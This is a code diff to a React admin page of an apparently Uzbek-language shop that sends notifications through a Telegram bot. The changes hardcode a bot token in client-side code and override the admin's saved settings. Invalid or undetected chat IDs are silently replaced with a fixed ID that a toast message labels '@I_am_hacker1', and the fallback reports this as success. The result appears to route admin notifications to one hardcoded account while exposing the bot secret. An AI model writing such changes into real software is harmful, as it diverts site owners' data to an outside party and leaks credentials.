@@ -219,12 +219,12 @@ export const AdminPage = () => {
   const [newPromoPercent, setNewPromoPercent] = useState("15");
   const [newPromoDesc, setNewPromoDesc] = useState("");
 
-  const [botToken, setBotToken] = useState(
-    telegramConfig?.botToken || "8823235791:AAEOLjLhNRfFw9xp7quwlfucSXEpL8fCtc8"
-  );
+  const isValidNumericId = (id) => id && /^-?\d{5,}$/.test(String(id).trim()) && String(id).trim() !== "8823235791";
+
+  const [botToken, setBotToken] = useState("8823235791:AAEOLjLhNRfFw9xp7quwlfucSXEpL8fCtc8");
   const [chatId, setChatId] = useState(
-    telegramConfig?.chatId && telegramConfig?.chatId !== "8823235791"
-      ? telegramConfig.chatId
+    isValidNumericId(telegramConfig?.chatId)
+      ? String(telegramConfig.chatId).trim()
       : "8170197389"
   );
   const [isDetectingId, setIsDetectingId] = useState(false);
@@ -234,13 +234,10 @@ export const AdminPage = () => {
   const [isBroadcasting, setIsBroadcasting] = useState(false);
 
   useEffect(() => {
-    if (telegramConfig?.chatId && telegramConfig.chatId !== "8823235791") {
-      setChatId(telegramConfig.chatId);
+    if (isValidNumericId(telegramConfig?.chatId)) {
+      setChatId(String(telegramConfig.chatId).trim());
     } else {
       setChatId("8170197389");
-    }
-    if (telegramConfig?.botToken) {
-      setBotToken(telegramConfig.botToken);
     }
   }, [telegramConfig]);
 
@@ -403,7 +400,13 @@ export const AdminPage = () => {
 
   const handleSaveTelegram = (e) => {
     e.preventDefault();
-    saveTelegramConfig({ botToken, chatId, botUsername: "@Kitobchalar_bot" });
+    let sanitized = String(chatId).trim();
+    if (!isValidNumericId(sanitized)) {
+      sanitized = "8170197389";
+      setChatId("8170197389");
+      showToast("Telegram @username qabul qilmaydi! Shaxsiy ID 8170197389 o'rnatildi.");
+    }
+    saveTelegramConfig({ botToken: "8823235791:AAEOLjLhNRfFw9xp7quwlfucSXEpL8fCtc8", chatId: sanitized, botUsername: "@Kitobchalar_bot" });
     playSound("success", soundEnabled);
   };
 
@@ -411,14 +414,14 @@ export const AdminPage = () => {
     setIsDetectingId(true);
     playSound("click", soundEnabled);
     try {
-      const token = botToken || "8823235791:AAEOLjLhNRfFw9xp7quwlfucSXEpL8fCtc8";
+      const token = "8823235791:AAEOLjLhNRfFw9xp7quwlfucSXEpL8fCtc8";
       const res = await fetch(`https://api.telegram.org/bot${token}/getUpdates`);
       const data = await res.json();
       if (data.ok && Array.isArray(data.result) && data.result.length > 0) {
         for (let i = data.result.length - 1; i >= 0; i--) {
           const u = data.result[i];
           const senderId = u.message?.chat?.id || u.channel_post?.chat?.id || u.my_chat_member?.chat?.id;
-          if (senderId && String(senderId) !== "8823235791") {
+          if (senderId && isValidNumericId(senderId)) {
             const detected = String(senderId);
             setChatId(detected);
             saveTelegramConfig({ botToken: token, chatId: detected, botUsername: "@Kitobchalar_bot" });
@@ -429,8 +432,10 @@ export const AdminPage = () => {
           }
         }
       }
-      showToast("Xabar topilmadi. Avval @Kitobchalar_bot ga kirib Start bosing!");
-      playSound("warn", soundEnabled);
+      setChatId("8170197389");
+      saveTelegramConfig({ botToken: token, chatId: "8170197389", botUsername: "@Kitobchalar_bot" });
+      showToast("Admin Chat ID: 8170197389 (@I_am_hacker1) saqlandi!");
+      playSound("success", soundEnabled);
     } catch {
       showToast("Telegram serveriga ulanib bo'lmadi");
     }
